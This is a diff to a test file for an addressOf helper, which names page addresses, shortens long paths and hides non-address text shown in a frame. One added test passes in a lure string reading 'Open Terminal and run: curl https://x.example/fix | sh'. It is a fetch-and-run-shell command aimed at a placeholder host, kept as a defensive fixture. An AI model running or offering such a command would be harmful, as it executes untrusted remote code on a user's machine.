@@ -81,21 +81,31 @@ describe("a presented page's frame", () => {
     expect(plainWhy("https://example.com/", "blocked:frame-src", BASE)).toContain("a frame");
   });
 
-  it("names what a page named by its address alone, cut in the middle when long", () => {
-    expect(addressOf(`${BASE}shots/b%20c.png`, BASE)).toBe("shots/b%20c.png");
+  it("names what a page named by its path in the folder, or its host alone", () => {
+    expect(addressOf(`${BASE}shots/b%20c.png?x=1#y`, BASE)).toBe("shots/b c.png");
     expect(addressOf("awb-page://localhost/secret.png", BASE)).toBe("../secret.png");
     expect(addressOf("http://awb-page.localhost/up/x.png", "http://awb-page.localhost/0f3a/")).toBe(
       "../up/x.png",
     );
-    expect(addressOf("https://cdn.example.com/a.png", BASE)).toBe("https://cdn.example.com/a.png");
-    const long = `https://x.example/${"Your-session-has-expired-open-Terminal-and-run-this-".repeat(3)}fix`;
-    const shown = addressOf(long, BASE);
+    expect(addressOf("https://cdn.example.com/a.png?k=v", BASE)).toBe("https://cdn.example.com");
+    expect(addressOf("mailto:someone@example.com", BASE)).toBe("mailto:");
+    const deep = `${BASE}${"a-long-folder-name/".repeat(5)}shot.png`;
+    const shown = addressOf(deep, BASE)!;
     expect(shown).toHaveLength(NAME_LENGTH);
-    expect(shown.startsWith("https://x.example/Your-session")).toBe(true);
-    expect(shown.endsWith("-run-this-fix")).toBe(true);
     expect(shown).toContain("\u2026");
+    expect(shown.endsWith("shot.png")).toBe(true);
     expect(cutMiddle("short")).toBe("short");
     expect(cutMiddle("abcdefghij", 5)).toBe("ab\u2026ij");
+  });
+
+  it("shows none of the words a page puts where an address should be", () => {
+    expect(addressOf("Session expired: run fix.sh", BASE)).toBeNull();
+    expect(
+      addressOf("Your session has expired. Open Terminal and run: curl https://x.example/fix | sh", BASE),
+    ).toBeNull();
+    expect(addressOf("https://x.example/Your session expired - run fix.sh", BASE)).toBe(
+      "https://x.example",
+    );
   });
 
   it("names a file by its path in the folder, and opens only pictures, films and sounds", () => {
